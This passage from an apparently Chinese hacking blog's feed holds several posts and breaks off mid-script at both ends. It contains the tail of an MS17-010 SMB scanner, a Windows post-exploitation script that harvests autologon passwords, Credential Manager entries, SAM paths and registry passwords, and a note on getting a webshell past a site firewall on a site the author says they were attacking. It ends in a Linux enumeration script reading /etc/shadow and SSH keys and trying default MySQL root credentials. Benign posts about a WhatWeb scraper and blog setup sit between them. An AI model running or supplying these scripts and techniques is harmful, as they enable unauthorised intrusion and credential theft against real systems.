(&apos;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;)payload1 = binascii.unhexlify(&apos;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&apos;)payload2 = binascii.unhexlify(&apos;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&apos;)payload3 = binascii.unhexlify(&apos;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&apos;)s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.settimeout(5)host=userport=445s.connect((host,port))print(&apos;[+]{}Ready to send&apos;.format(host))s.send(payload0)s.recv(1024)print(&apos;[+]{}Setting request&apos;.format(host))s.send(payload1)session_setup_response=s.recv(1024)user_id=session_setup_response[32:34]print(host,&apos;User ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,user_id)[0])modified_tree_connect_request=list(payload2)modified_tree_connect_request[32]=user_id[0]modified_tree_connect_request[33]=user_id[1]modified_tree_connect_request=&quot;&quot;.join(&apos;%s&apos;%ld for ld in modified_tree_connect_request)print(&apos;[+]{}Send connection&apos;.format(host))s.send(payload2)tree_connect_response=s.recv(1024)tree_id=tree_connect_response[28:30]print(&apos;[+]{}&apos;.format(host),&apos;Tree ID=%s&apos;%struct.unpack(&apos;&lt;H&apos;,tree_id)[0])modified_trans2_session_setup=list(payload3)modified_trans2_session_setup[28]=tree_id[0]modified_trans2_session_setup[29]=tree_id[1]modified_trans2_session_setup[32]=user_id[0]modified_trans2_session_setup[33]=user_id[1]modified_trans2_session_setup=&quot;&quot;.join(&apos;{}&apos;.format(li for li in modified_trans2_session_setup))print(&apos;[+]{}Sending success is actually returning.&apos;.format(host))s.send(payload3)final_respone=s.recv(1024)s.close()if final_respone[32]==&quot;\x51&quot;:    print(&apos;[*]existence MS17-010&apos;)else:    print(&apos;[-]Not existence MS17-010&apos;)def run():    scan()run()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/UuZtBJw.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows提权辅助脚本</title>
      <link href="/2018/08/09/windows%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/08/09/windows%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>进入到后渗透阶段就涉及到了提权。提权的第一步是信息收集，所以这个脚本因此而诞生。当然Demon哥分享的干货是够干的</p><p><img src="https://i.imgur.com/VJFPdww.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>windows提权用到的命令：</p><pre><code>systeminfonet usernet user user1ipconfig /allroute printarp -Anetstat -anonetsh firewall show stateschtasks /query /fo LIST /vtasklist /SVCnet startDRIVERQUERYwmic qfe get Caption,Description,HotFixID,InstalledOnwmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;sc qc Spooler</code></pre><p>等等之类的</p><p>代码：</p><pre><code>import osdef collect():    xj=open(&apos;save.txt&apos;,&apos;w&apos;)    xj.close()    print(&apos;[+]什么是操作系统和架构？它缺少任何补丁吗？&apos;)    systeminfo=os.popen(&apos;systeminfo&apos;)    wmic_qfe=os.popen(&apos;wmic qfe&apos;)    for s in systeminfo:        print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for c in wmic_qfe:        print(c,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]环境变量有什么有趣的吗？域控制器在LOGONSERVER？&apos;)    set=os.popen(&apos;set&apos;)    #Get_chiditem=os.popen(&apos;Get-ChildItem Env: | ft Key,Value&apos;)    for e in set:        print(e,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for t in Get_chiditem:        #print(t,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他连接的驱动器吗？&apos;)    net_use=os.popen(&apos;net use&apos;)    wmic_log=os.popen(&apos;wmic logicaldisk get caption,description,providername&apos;)    #psd=os.popen(&apos;Get-PSDrive | where {$_.Provider -like &quot;Microsoft.PowerShell.Core\FileSystem&quot;}| ft Name,Root&apos;)    for ne in net_use:        print(ne,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for g in wmic_log:        print(g,file=open(&apos;save.txt&apos;,&apos;a&apos;))    #for d in psd:        #print(d,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]你是谁？&apos;)    whoami=os.popen(&apos;whoami&apos;)    username=os.popen(&apos;echo %USERNAME%&apos;)    for whoa in whoami:        print(whoa,file=open(&apos;save.txt&apos;,&apos;a&apos;))    for m in username:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]任何有趣的用户权限？注意：“状态”列并不表示用户具有或无权访问此权限。如果列出了该权限，则该用户拥有该权限。&apos;)    priv=os.popen(&apos;whoami /priv&apos;)    for i in priv:        print(i,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户在系统上有什么用途？任何未清理的旧用户配置文件？&apos;)    ur=os.popen(&apos;net users&apos;)    bw=os.popen(&apos;dir /b /ad &quot;C:/Users/&quot;&apos;)    #bs=os.popen(&apos;dir /b /ad &quot;C:/Documents and Settings/&quot; # Windows XP and below&apos;)    for r in ur:        print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))        for w in bw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))            #for s in bs:                #print(s,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他人登录吗？&apos;)    qwinsta=os.popen(&apos;qwinsta&apos;)    for w in qwinsta:        print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上有哪些组？&apos;)    net_localgroup=os.popen(&apos;net localgroup&apos;)    for group in net_localgroup:        print(group,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]Administrators组中是否有任何用户？&apos;)    net_localgroup_Administrators=os.popen(&apos;net localgroup Administrators&apos;)    for administrator in net_localgroup_Administrators:        print(administrator,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]用户自动登录注册表中的任何内容？&apos;)    reg_query=os.popen(&apos;reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot; 2&gt;nul | findstr &quot;DefaultUserName DefaultDomainName DefaultPassword&quot;&apos;)    for v in reg_query:        print(v,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]在Credential Manager中有什么有趣的东西吗？&apos;)    cmdkey_list=os.popen(&apos;cmdkey /list&apos;)    for l in cmdkey_list:        print(l,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]cmdkey /list我们可以访问SAM和SYSTEM文件吗？&apos;)    lg=[&apos;%SYSTEMROOT%/repair/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/SAM&apos;,&apos;%SYSTEMROOT%/System32/config/SAM&apos;,&apos;%SYSTEMROOT%/repair/system&apos;,&apos;%SYSTEMROOT%/System32/config/SYSTEM&apos;,&apos;%SYSTEMROOT%/System32/config/RegBack/system&apos;]    for k in lg:        system=os.popen(k)        for q in system:            print(q,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]安装了什么软件？&apos;)    rj=[&apos;dir /a &quot;C:\Program Files&quot;&apos;,&apos;dir /a &quot;C:\Program Files (x86)&quot;&apos;,&apos;reg query HKEY_LOCAL_MACHINE\SOFTWARE&apos;]    for j in rj:        qw=os.popen(j)        for w in qw:            print(w,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]程序文件夹中每个人或用户的完全权限？&apos;)    icacls=[&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot; 2&gt;nul&apos;,&apos;icacls &quot;C:\Program Files\*&quot; 2&gt;nul &apos;,&apos;icacls &quot;C:\Program Files (x86)\*&quot;&apos;]    for aw in icacls:        qdw=os.popen(aw)        for rs in qdw:            print(rs,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]系统上正在运行的进程/服务是什么？内部服务没有暴露吗？如果是这样，我们可以打开它吗？&apos;)    tasklist=[&apos;tasklist /svc&apos;,&apos;tasklist /v&apos;,&apos;net start&apos;,&apos;sc query&apos;,]    for t in tasklist:        wx=os.popen(t)        for p in wx:            print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有没有不带引号的服务路径？&apos;)    wmcs=os.popen(&apos;wmic service get name,displayname,pathname,startmode 2&gt;nul |findstr /i &quot;Auto&quot; 2&gt;nul |findstr /i /v &quot;C:\Windows\\&quot; 2&gt;nul |findstr /i /v &quot;&quot;&quot;&apos;)    for m in wmcs:        print(m,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]那里有什么预定的任务？什么定制实施？&apos;)    xw=os.popen(&apos;schtasks /query /fo LIST 2&gt;nul | findstr TaskName&apos;)    print(xw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]启动时跑了什么？&apos;)    qz=[&apos;wmic startup get caption,command&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run&apos;,&apos;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&apos;,&apos;dir &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;&apos;,&apos;dir &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;&apos;]    for z in qz:        xq=os.popen(z)        for r in xq:            print(r,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]连接了哪些NIC？有多个网络吗？&apos;)    ipconfig_all=os.popen(&apos;ipconfig /all&apos;)    for all in ipconfig_all:        print(all,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]我们有什么路线？&apos;)    xpo=os.popen(&apos;route print&apos;)    for o in xpo:        print(o,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]ARP缓存中的任何内容？&apos;)    arp=os.popen(&apos;arp -a&apos;)    for p in arp:        print(p,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有与其他主机的连接？&apos;)    sw=os.popen(&apos;netstat -ano&apos;)    for b in sw:        print(b,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]防火墙是否已打开？如果是这样配置的是什么？&apos;)    fq=[&apos;netsh firewall show state&apos;,&apos;netsh firewall show config&apos;,&apos;netsh advfirewall firewall show rule name=all&apos;,&apos;netsh advfirewall export &quot;firewall.txt&quot;&apos;]    for u in fq:        fhq=os.popen(u)        for f in fhq:            print(f,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]还有其他有趣的界面配置吗？&apos;)    netsh_dump=os.popen(&apos;netsh dump&apos;)    for ump in netsh_dump:        print(ump,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]注册表中的任何密码？&apos;)    lv=[&apos;reg query HKCU /f password /t REG_SZ /s&apos;,&apos;reg query HKLM /f password /t REG_SZ /s &apos;]    for pasw in lv:        passwd=os.popen(pasw)        for pd in passwd:            print(pd,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]是否有可用的sysprep或无人值守文件？&apos;)    zi=os.popen(&apos;dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul&apos;)    for nb in zi:        print(nb,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;[+]有待观察的有趣文件吗？可能在用户目录（桌面，文档等）中？&apos;)    sl=os.popen(&apos;dir /s *pass* == *vnc* == *.config* 2&gt;nul&apos;)    for lw in sl:        print(lw,file=open(&apos;save.txt&apos;,&apos;a&apos;))    print(&apos;&apos;)    print(&apos;&apos;)    print(&apos;[*]判断是否存在以下路径&apos;)    lss=[]    if os.path.exists(&apos;list.txt&apos;):        print(&apos;[+]存在list.txt&apos;)    else:        print(&apos;[-]不存在list.txt&apos;)        exit()    dk=open(&apos;list.txt&apos;,&apos;r&apos;)    for r in dk.readlines():        qk=&quot;&quot;.join(r.split(&apos;\n&apos;))        lss.append(qk)    for g in lss:        if os.path.exists(g):            print(&apos;[+]存在 {}&apos;.format(g))        else:            print(&apos;[-]不存在{}&apos;.format(g))collect()</code></pre><p>测试结果：<br><img src="https://i.imgur.com/tpS2Tob.png" alt=""></p><p><img src="https://i.imgur.com/3KobSkD.png" alt=""></p><p>收集到的信息会写入save.txt<br>save.txt的结果：<a href="https://paste.ubuntu.com/p/dR5QGJBHY2/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/dR5QGJBHY2/</a></p><p>关于提权的两篇文章：</p><pre><code>http://www.fuzzysecurity.com/tutorials/16.htmlhttps://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</code></pre><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>爬虫抓取whatweb接口</title>
      <link href="/2018/08/08/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96whatweb%E6%8E%A5%E5%8F%A3/"/>
      <url>/2018/08/08/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96whatweb%E6%8E%A5%E5%8F%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前一直想抓whatweb的接口。但是明明写的没有毛病，就是抓不了今天不死心的在写了一次。发现了问题的所在</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=453413076,2870052388&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>什么是whatweb？</strong></p><pre><code>什么是WhatWeb？WhatWeb识别网站。它的目标是回答“这是什么网站？”的问题。WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，JavaScript库，Web服务器和嵌入式设备。WhatWeb拥有超过1700个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，帐户ID，Web框架模块，SQL错误等。WhatWeb可以隐秘，快速，或彻底但缓慢。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当您在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“隐身”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。开发了更积极的模式用于渗透测试。大多数WhatWeb插件都是彻底的，并且可以识别从微妙到显而易见的一系列线索。例如，大多数WordPress网站可以通过元HTML标签识别，例如&apos;&apos;，但少数WordPress网站删除了这个识别标签，但这并不妨碍WhatWeb。WordPress WhatWeb插件有超过15个测试，包括检查favicon，默认安装文件，登录页面，以及检查相对链接中的“/ wp-content /”。</code></pre><p><strong>whatweb在线检测地址：</strong><br><a href="https://www.whatweb.net/" target="_blank" rel="noopener">https://www.whatweb.net/</a></p><p>基本操作抓包：<br><img src="https://i.imgur.com/HVLhIyA.png" alt=""></p><p>从图中可以看见请求参数为<strong>target</strong><br>然后正常的写一个headers，然后用requests进行post请求应该就是这样吧= =很遗憾的是，这样子什么也不会返回。后来我看了一下<strong>控制台</strong>才发现原因。</p><p><img src="https://i.imgur.com/Q7prpQN.png" alt=""></p><p>图中的意思是，没有<strong>Console</strong>和<strong>Content-length</strong>头拒绝进行识别，后面抱着半信半疑的进行了测试发现居然可以了<br>代码：</p><pre><code>#-*-coding:&apos;utf-8&apos;-*-#name:九世#time:2018-8-8-20:58import requestsfrom bs4 import BeautifulSoupdef whatweb():    banner=&apos;&apos;&apos; ____  __.__.__  .__                |    |/ _|__|  | |  |  __ _______   |      &lt; |  |  | |  | |  |  \__  \  |    |  \|  |  |_|  |_|  |  // __ \_|____|__ \__|____/____/____/(____  /        \/                       \/ &apos;&apos;&apos;    print(banner)    user=input(&apos;Domain name to be querying:&apos;)    headers={&apos;user-agent&apos;:&apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,             &apos;Content-length&apos;:&apos;20&apos;,             &apos;Connection&apos;:&apos;keep-alive&apos;}    data={&apos;target&apos;: &apos;{}&apos;.format(user)}    url=&apos;https://www.whatweb.net/&apos;    reqts=requests.post(url=url,headers=headers,data=data)    dw=BeautifulSoup(reqts.text,&apos;html.parser&apos;)    for p in dw.find_all(&apos;pre&apos;):        print(p.get_text())def jy2():    banner = &apos;&apos;&apos; ____  __.__.__  .__                    |    |/ _|__|  | |  |  __ _______       |      &lt; |  |  | |  | |  |  \__  \      |    |  \|  |  |_|  |_|  |  // __ \_    |____|__ \__|____/____/____/(____  /            \/                       \/ &apos;&apos;&apos;    print(banner)    user = input(&apos;file:&apos;)    dk=open(&apos;{}&apos;.format(user),&apos;r&apos;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&apos;\n&apos;))        headers = {            &apos;user-agent&apos;: &apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36&apos;,            &apos;Content-length&apos;: &apos;20&apos;,            &apos;Connection&apos;: &apos;keep-alive&apos;}        data = {&apos;target&apos;: &apos;{}&apos;.format(qc)}        url = &apos;https://www.whatweb.net/&apos;        reqts = requests.post(url=url, headers=headers, data=data)        dw = BeautifulSoup(reqts.text, &apos;html.parser&apos;)        for p in dw.find_all(&apos;pre&apos;):            print(p.get_text())print(&apos;[1] 单个域名&apos;)print(&apos;[2] 批量导入&apos;)xw=input(&apos;xz=&gt;:&apos;)if xw==&apos;1&apos;:    whatweb()elif xw==&apos;2&apos;:    jy2()</code></pre><p>两个功能，一个单检测，一个批量导入进行检测。<br>测试图如下：</p><p><img src="https://i.imgur.com/xZyzBvT.png" alt=""></p><p><img src="https://i.imgur.com/pDIc0Yl.png" alt=""></p><p>转载请声明：来自422926799.github.com</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>绕过网站防火墙上传</title>
      <link href="/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/"/>
      <url>/2018/08/06/%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前几天在搞站的时候，拿到了一个webshell。一开始还没有网站防火墙之类的东西，好像是一句话被管理员发现了。安了防火墙和360…360是恶心的一批的东西。</p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>其实方法很简单，注意看图，这是一开始普通上传没有做任何修改的<br>会被直接拦截<br><img src="https://i.imgur.com/L8tVoiA.png" alt=""></p><p>把图中所画的空格去掉，就能产生BUG导致上传成功。<br><img src="https://i.imgur.com/vpOPLpA.png" alt=""></p><p>上传成功<br><img src="https://i.imgur.com/tqNBsFZ.png" alt=""></p><p><img src="https://i.imgur.com/7pJXcKj.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一波三折的博客环境重新搭建</title>
      <link href="/2018/08/05/%E4%B8%80%E6%B3%A2%E4%B8%89%E6%8A%98%E7%9A%84%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E9%87%8D%E6%96%B0%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/08/05/%E4%B8%80%E6%B3%A2%E4%B8%89%E6%8A%98%E7%9A%84%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83%E9%87%8D%E6%96%B0%E6%90%AD%E5%BB%BA/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天该死的Ubuntu崩了。。。然后博客环境也没有了。W_W，百度各种办法发现无法恢复。后面干脆重新建一个，反正文章有备份。以后一定备份博客。。。喵了个咪的。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1325385962,3551867219&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>首先把仓库删除，安装Git，nodejs。然后在安装hexo</p><pre><code>git下载地址：https://git-scm.com/nodejs下载地址：https://nodejs.org/en/下载好后，各自安装</code></pre><p>在x盘创建一个目录，名为mylogo。然后进入其目录执行</p><pre><code>npm install -g hexonpm install hexo-deployer-git --save</code></pre><p>然后下载Cactus主题，进行替换更改。在进行创建新的分类</p><pre><code>hexo new page Writing</code></pre><p>修改_config.yml改名字等等之类的东西。在添加cactus的站内搜索功能</p><pre><code>hexo new page Searchnpm install hexo-generator-search --save进入source/Search目录，修改index.md,添加Search: true</code></pre><p>在将备份的文章放入source/_posts,在git bash创建ssh，然后将其放入github。执行hexo -d。执行之后发现</p><pre><code>ERROR Deployer not found: .git</code></pre><p>安装hexo-depoyer-git，将git添加其环境变量。进行电脑重启，执行git init,然后在执行hexo -d,在次执行hexo -d 发现一个警告为IP永久添加RSA秘钥之类的。打开host文件添加 </p><pre><code>“自己的IP” github.com</code></pre><p>之后在次执行发现</p><pre><code>warning: LF will be replaced by CRLF in xxxx</code></pre><p>解决方法：</p><pre><code>git config --global core.autocrlf false</code></pre><p>再次执行hexo -d，发现没有毛病了。再次，成功的把博客搭建好了。。。<br>这次没加2D模型。有人说太宅男了。</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hello World</title>
      <link href="/2018/08/05/hello-world/"/>
      <url>/2018/08/05/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux信息收集</title>
      <link href="/2018/08/01/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/08/01/Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。<br>很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张）<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路</strong>：</p><pre><code>0.首先要获取系统信息：系统名称本地ip主机名本地dns环境变量shell程序hosts文件路由信息arp缓存计划任务挂载磁盘mail目录history文件home/root/bin/sbin目录1.获取用户信息当前权限用户信息本地用户在线用户hash加密规则hash信息用户组信息最后登录信息最后登录用户信息所有用户的计划任务2.安全扫描是否能无密码sudoconf配置文件ssh的密钥文件是否能root登录敏感配置文件扫描关键字含有config、web.xml、database、pass的文件uid为0用户敏感服务匿名空密码用户zip/tar.gz/sh/pl/py/rb/txt/bak后缀文件3.全部命令放入一个列表里，说明放入一个列表里4.遍历写入</code></pre><p>代码：</p><pre><code>import osml=[&apos;uname -a&apos;,&apos;cat /etc/issue&apos;,&apos;hostname&apos;,&apos;cat /etc/hosts&apos;,&apos;who&apos;,&quot;awk -F &apos;:&apos; &apos;{print $1,$3,$4,$6;}&apos; /etc/passwd&quot;,&apos;cat /etc/group&apos;,&apos;cat /etc/shadow&apos;,&apos;grep -v -E &quot;^#&quot; /etc/passwd&apos;,&apos;cat ~/.bash_history&apos;,&apos;w&apos;,&apos;netstat&apos;,&apos;ps -aux&apos;,&apos;dpkg -l&apos;,&apos;netstat -antpu&apos;,&apos;arp -a&apos;,&apos;uname -a 2&gt;/dev/null&apos;,&apos;hostname&apos;,&apos;lastlog&apos;,&apos;for i in $(cat /etc/passwd 2&gt;/dev/null&apos;,&quot;grep -v &apos;^[^:]*:[x]&apos; /etc/passwd 2&gt;/dev/null&quot;,&apos;grep -v &quot;^#&quot; /etc/passwd&apos;,&apos;cat /etc/shadow 2&gt;/dev/null&apos;,&apos;cat /etc/master.passwd 2&gt;/dev/null&apos;,&apos;echo &apos;&apos;sudo -S -l 2&gt;/dev/null&apos;,&apos;ls -ahl /root/ 2&gt;/dev/null&apos;,&apos;ls -ahl /home/ 2&gt;/dev/null&apos;,&apos;find / -writable -not -user \`whoami\` -type f -not -path &quot;/proc/*&quot; -exec ls -al {} \; 2&gt;/dev/null&apos;,&apos;find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls&apos;,&apos;&apos;&apos;grep &quot;PermitRootLogin &quot; /etc/ssh/sshd_config 2&gt;/dev/null | grep -v &quot;#&quot; | awk &apos;{print  $2}&apos;&apos;&apos;,&apos;echo $PATH 2&gt;/dev/null&apos;,&apos;cat /etc/shells 2&gt;/dev/null&apos;,&apos;cat /etc/login.defs 2&gt;/dev/null | grep &quot;PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD&quot; 2&gt;/dev/null | grep -v &quot;#&quot; 2&gt;/dev/null&apos;,&apos;ls -la /etc/cron* 2&gt;/dev/null&apos;,&apos;cat /etc/crontab 2&gt;/dev/null&apos;,&apos;cat /etc/passwd | cut -d &quot;:&quot; -f 1 | xargs -n1 crontab -l -u 2&gt;/dev/null&apos;,&apos;cat /etc/resolv.conf 2&gt;/dev/null&quot;&apos;,&apos;route 2&gt;/dev/null&apos;,&apos;netstat -antp 2&gt;/dev/null&apos;,&apos;netstat -anup 2&gt;/dev/null&apos;,&apos;ps aux 2&gt;/dev/null&apos;,&quot;ps aux&quot;,&quot;&apos;ls -la /etc/init.d 2&gt;/dev/null&apos;&quot;,&quot;find /etc/init.d/ \! -uid 0 -type f 2&gt;/dev/null&quot;,&quot;mysql --version 2&gt;/dev/null&quot;,&quot;sudo -V 2&gt;/dev/null&quot;,&quot;mysqladmin -uroot -proot version 2&gt;/dev/null&quot;,&quot;psql -V 2&gt;/dev/null&quot;,&quot;apache2 -v 2&gt;/dev/null; httpd -v 2&gt;/dev/null&quot;,&quot;&quot;&quot;awk &apos;{sub(/.*\export 